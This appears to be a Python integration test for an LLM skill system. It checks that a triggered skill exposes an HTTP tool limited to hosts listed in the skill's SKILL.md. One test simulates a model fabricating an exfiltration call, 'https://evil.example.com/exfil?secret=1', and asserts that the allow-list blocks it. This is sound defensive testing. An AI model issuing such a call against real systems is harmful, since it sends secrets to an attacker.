"""端到端集成测试：导入 skill → trigger 命中 → invoke → http_get_json → 拼装答复。

这条测试链路覆盖用户反馈的核心场景：
``cq-qa-financial-reportcheck`` 这种"看 SKILL.md 调外部 API"的技能，
从触发词命中到工具调用执行到结果回灌，整条路径都跑通——不再"卡住"或
"虚构默认数据"。

外部网络由 ``httpx.MockTransport`` 拦截，无依赖；与生产环境唯一差别仅
"实际 HTTP 是否能到达 172.17.208.45"，这是用户网络问题，不是代码问题。
"""

from __future__ import annotations

import json
import uuid
from unittest.mock import AsyncMock

import httpx
import pytest

from app.modules.llm.models import ChatSession
from app.modules.skills import http_tools, safe_invoke, skill_router
from app.modules.skills.models import Skill


def _financial_skill() -> Skill:
    """复刻用户上传的 cq-qa-financial-reportcheck skill 的关键骨架。"""
    return Skill(
        id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        name="长轻电商订单数据查询",
        slug="cq-qa-financial-reportcheck",
        description="实时查询订单底表更新情况",
        body=(
            "# 长轻电商订单数据查询\n\n"
            "## 何时使用\n"
            "用户问订单底表是否更新、各平台数据时调用。\n\n"
            "## 接口\n"
            "GET http://172.17.208.45:5004/api/platform-updates/all\n"
            "GET http://172.17.208.45:5004/api/platform-updates/by-date?date=2026-04-16\n"
            "GET http://172.17.208.45:5006/api/platform-updates/all?month=2026-03\n"
        ),
        triggers=[
            "长轻订单底表检查",
            "长轻财务报表查询",
            "电商底表数据更新时间查询",
        ],
        tools_required=[],
        activation_mode="trigger",
        is_enabled=True,
        category="custom",
        semantic_version="4.5.0",
        tags=[],
        attachments=[],
        source="imported",
        safety_scan_status="clean",
        db_version=1,
        created_by=uuid.uuid4(),
    )


@pytest.mark.asyncio
async def test_full_chain_trigger_invoke_http_dispatch(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """触发命中 → 暴露 http_* → safe_run_tool 派发后实际请求，验证白名单生效。"""
    proj = uuid.uuid4()
    skill = _financial_skill()
    skill.project_id = proj

    monkeypatch.setattr(skill_router, "_list_always_skills", AsyncMock(return_value=[]))
    monkeypatch.setattr(skill_router, "_fetch_skills_by_ids", AsyncMock(return_value=[]))
    monkeypatch.setattr(skill_router, "match_triggers", AsyncMock(return_value=[skill]))
    monkeypatch.setattr(skill_router, "_list_agent_callable", AsyncMock(return_value=[]))

    # 1. compose：本轮 candidate skill 含 url，应自动暴露 http_* 工具 + 收集白名单
    ctx = await skill_router.compose(
        AsyncMock(),
        proj,
        ChatSession(project_id=proj, user_id=uuid.uuid4()),
        "长轻订单底表检查",
    )
    tool_names = {t["function"]["name"] for t in ctx.candidate_tools}
    assert "skill_cq-qa-financial-reportcheck__invoke" in tool_names
    assert "http_get_json" in tool_names
    assert ctx.allowed_http_hosts == frozenset(
        {"172.17.208.45:5004", "172.17.208.45:5006"},
    )

    # 2. mock 网络层：httpx 任何请求直接返回 200 + 模拟"全部平台最新更新"JSON
    mock_payload = {
        "data": [
            {"shop": "天猫·主店", "platform": "tmall", "update_day": "2026-04-16"},
            {"shop": "京东·官方", "platform": "jd", "update_day": "2026-04-15"},
        ],
    }
    captured: dict = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["url"] = str(request.url)
        captured["host"] = request.url.host
        captured["port"] = request.url.port
        return httpx.Response(
            200,
            headers={"content-type": "application/json"},
            content=json.dumps(mock_payload).encode("utf-8"),
        )

    transport = httpx.MockTransport(handler)
    original_init = httpx.AsyncClient.__init__

    def patched_init(self, *args, **kwargs):  # noqa: ANN001
        kwargs["transport"] = transport
        return original_init(self, *args, **kwargs)

    monkeypatch.setattr(httpx.AsyncClient, "__init__", patched_init)

    # 3. 模拟 LLM 调 http_get_json：safe_run_tool 派发并执行
    raw = await safe_invoke.safe_run_tool(
        AsyncMock(),
        "http_get_json",
        json.dumps({"url": "http://172.17.208.45:5004/api/platform-updates/all"}),
        active_system_skill_slugs=ctx.active_system_skill_slugs,
        skill_id_by_tool_name=ctx.skill_id_by_tool_name,
        allowed_platform_tools=ctx.allowed_platform_tools,
        session_id=None,
        project_id=proj,
        allowed_http_hosts=ctx.allowed_http_hosts,
    )
    out = json.loads(raw)

    assert out["ok"] is True
    assert out["status_code"] == 200
    assert out["json"] == mock_payload
    assert captured["host"] == "172.17.208.45"
    assert captured["port"] == 5004

    # 4. 调用结束 ContextVar 已被 reset
    assert http_tools.get_active_allowed_hosts() == frozenset()


@pytest.mark.asyncio
async def test_full_chain_blocks_url_outside_skill_md(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """LLM 学坏：编造一个 SKILL.md 没写过的 host —— 必须被拒掉，不实际发包。"""
    proj = uuid.uuid4()
    skill = _financial_skill()
    skill.project_id = proj

    monkeypatch.setattr(skill_router, "_list_always_skills", AsyncMock(return_value=[]))
    monkeypatch.setattr(skill_router, "_fetch_skills_by_ids", AsyncMock(return_value=[]))
    monkeypatch.setattr(skill_router, "match_triggers", AsyncMock(return_value=[skill]))
    monkeypatch.setattr(skill_router, "_list_agent_callable", AsyncMock(return_value=[]))

    ctx = await skill_router.compose(
        AsyncMock(),
        proj,
        ChatSession(project_id=proj, user_id=uuid.uuid4()),
        "长轻财务报表查询",
    )

    # 任何向 httpx 的请求都视为失败——这条断言保证白名单是真的拦下了
    bad_call_count = {"n": 0}

    def handler(_request: httpx.Request) -> httpx.Response:
        bad_call_count["n"] += 1
        return httpx.Response(200, content=b"BAD")

    transport = httpx.MockTransport(handler)
    original_init = httpx.AsyncClient.__init__

    def patched_init(self, *args, **kwargs):  # noqa: ANN001
        kwargs["transport"] = transport
        return original_init(self, *args, **kwargs)

    monkeypatch.setattr(httpx.AsyncClient, "__init__", patched_init)

    raw = await safe_invoke.safe_run_tool(
        AsyncMock(),
        "http_get_json",
        json.dumps({"url": "https://evil.example.com/exfil?secret=1"}),
        active_system_skill_slugs=ctx.active_system_skill_slugs,
        skill_id_by_tool_name=ctx.skill_id_by_tool_name,
        allowed_platform_tools=ctx.allowed_platform_tools,
        session_id=None,
        project_id=proj,
        allowed_http_hosts=ctx.allowed_http_hosts,
    )
    out = json.loads(raw)
    assert out["ok"] is False
    assert "白名单" in out["error"] or "允许" in out["error"]
    # 关键：白名单拦截发生在 _do_request 之前，httpx mock 不应被触发过一次
    assert bad_call_count["n"] == 0
